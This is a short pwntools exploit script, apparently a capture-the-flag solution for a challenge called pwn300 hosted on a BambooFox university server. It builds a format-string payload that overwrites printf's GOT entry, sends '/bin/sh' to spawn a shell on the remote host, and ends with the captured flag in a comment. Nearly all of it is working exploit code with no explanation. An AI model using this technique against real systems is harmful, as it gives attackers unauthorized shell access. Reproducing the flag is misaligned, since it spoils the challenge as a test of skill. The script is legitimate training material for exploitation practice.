from pwn import *

# def exec_fmt(payload):
# 	p = process("./pwn300")
# 	p.sendline(payload)
# 	return p.recv(4096)

# autofmt = FmtStr(exec_fmt)
# offset = autofmt.offset
offset = 7
# sh = process("pwn300")

sh = remote("bamboofox.cs.nctu.edu.tw", 22003)
got_printf = 0x804a00c
payload = fmtstr_payload(offset, {got_printf: 0x8048410}, write_size='short')
sh.sendline(payload)
sh.sendline('/bin/sh')
sh.interactive()

# BAMBOOFOX{GOT_IT_BY_OVERWRITE_GOT_TABLE_OR_NOT}
